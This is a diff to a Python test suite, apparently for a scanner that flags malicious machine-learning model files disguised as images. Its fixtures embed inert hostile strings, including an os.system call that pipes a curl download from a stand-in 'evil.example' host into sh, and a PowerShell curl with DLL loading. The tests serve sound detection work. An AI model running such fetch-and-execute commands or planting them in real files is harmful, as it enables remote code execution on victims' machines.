@@ -46,6 +46,25 @@ def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
     path.write_bytes(data)
 
 
+def _write_malicious_cntk(path: Path, include_structure: bool = True) -> None:
+    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
+    structure = b" CompositeFunction primitive_functions " if include_structure else b""
+    payload = b" native_user_function loadlibrary C:\\temp\\evil.dll powershell -c curl http://evil.example/p.sh "
+    path.write_bytes(prefix + structure + payload)
+
+
+def _write_malicious_lightgbm(path: Path, valid: bool = True) -> None:
+    body = "tree=0\nversion=v4\nnum_class=1\n"
+    if valid:
+        body += (
+            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\nnum_leaves=2\n"
+            "split_feature=0\nleaf_value=0.1 0.2\n"
+            "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')\n"
+            "callback_url=https://collector.evil.example/payload.sh\n"
+        )
+    path.write_text(body, encoding="utf-8")
+
+
 class TestDirectoryFileFiltering:
     """Test directory scanning with file filtering."""
 
@@ -218,6 +237,42 @@ class TestDirectoryFileFiltering:
 
         assert results["files_scanned"] == 1
         assert any("payload.jpg" in (issue.location or "") for issue in results.issues)
+
+    def test_disguised_cntk_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        disguised_payload = tmp_path / "cntk.jpg"
+        _write_malicious_cntk(disguised_payload)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "cntk" in results.scanner_names
+        assert any(issue.severity.value == "critical" for issue in results.issues)
+
+    def test_disguised_cntk_near_match_remains_skipped(self, tmp_path: Path) -> None:
+        near_match = tmp_path / "cntk-near-match.jpg"
+        _write_malicious_cntk(near_match, include_structure=False)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 0
+
+    def test_disguised_lightgbm_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        disguised_payload = tmp_path / "lightgbm.jpg"
+        _write_malicious_lightgbm(disguised_payload)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "lightgbm" in results.scanner_names
+        assert any(issue.severity.value == "critical" for issue in results.issues)
+
+    def test_disguised_lightgbm_near_match_remains_skipped(self, tmp_path: Path) -> None:
+        near_match = tmp_path / "lightgbm-near-match.jpg"
+        _write_malicious_lightgbm(near_match, valid=False)
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 0
 
     @pytest.mark.parametrize("filename", [".payload", "Makefile", "package.json", "CHANGELOG"])
     def test_disguised_pickle_with_default_hidden_or_basename_skip_is_scanned(
